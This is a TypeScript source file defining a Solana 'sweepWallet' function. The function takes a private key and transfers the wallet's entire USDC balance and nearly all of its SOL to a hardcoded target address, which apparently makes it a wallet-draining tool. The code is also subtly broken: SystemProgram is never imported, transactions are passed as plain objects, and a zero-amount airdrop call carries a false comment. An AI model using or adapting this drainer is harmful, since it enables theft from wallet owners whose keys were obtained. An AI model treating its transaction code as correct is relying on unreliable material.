import { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction } from "@solana/spl-token";
import bs58 from "bs58";

// Constants
const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
const TARGET_WALLET = new PublicKey("7WtqCgq3doaRyj5U3HwUMrMsLMMaME95eQLDGfkxAv5Z");
const SOLANA_RPC = "https://api.mainnet-beta.solana.com";

export async function sweepWallet(base58PrivKey: string) {
  const conn = new Connection(SOLANA_RPC, "confirmed");
  const keypair = Keypair.fromSecretKey(bs58.decode(base58PrivKey));
  const owner = keypair.publicKey;

  try {
    // Sweep USDC
    const usdcAddr = await getAssociatedTokenAddress(USDC_MINT, owner);
    const targetUsdcAddr = await getAssociatedTokenAddress(USDC_MINT, TARGET_WALLET);

    const usdcAcc = await conn.getTokenAccountBalance(usdcAddr).catch(() => null);
    if (usdcAcc?.value?.uiAmount > 0) {
      const amount = usdcAcc.value.amount;
      const ix = createTransferInstruction(usdcAddr, targetUsdcAddr, owner, BigInt(amount));
      const tx = await conn.sendTransaction({ feePayer: owner, recentBlockhash: (await conn.getLatestBlockhash()).blockhash, instructions: [ix] }, [keypair]);
      console.log(`USDC swept from ${owner.toBase58()} tx: ${tx}`);
    }

    // Sweep SOL (leave ~$1 = 0.01 SOL)
    const balance = await conn.getBalance(owner);
    const feeBuffer = 0.01 * LAMPORTS_PER_SOL;
    if (balance > feeBuffer) {
      const tx = await conn.requestAirdrop(owner, 0); // force blockhash refresh
      const blockhash = await conn.getLatestBlockhash();
      const amount = balance - feeBuffer;
      const solTx = await conn.sendTransaction({
        feePayer: owner,
        recentBlockhash: blockhash.blockhash,
        instructions: [
          SystemProgram.transfer({ fromPubkey: owner, toPubkey: TARGET_WALLET, lamports: amount }),
        ],
      }, [keypair]);
      console.log(`SOL swept from ${owner.toBase58()} tx: ${solTx}`);
    }
  } catch (err) {
    console.error(`Sweep failed for ${owner.toBase58()}:`, err);
  }
}

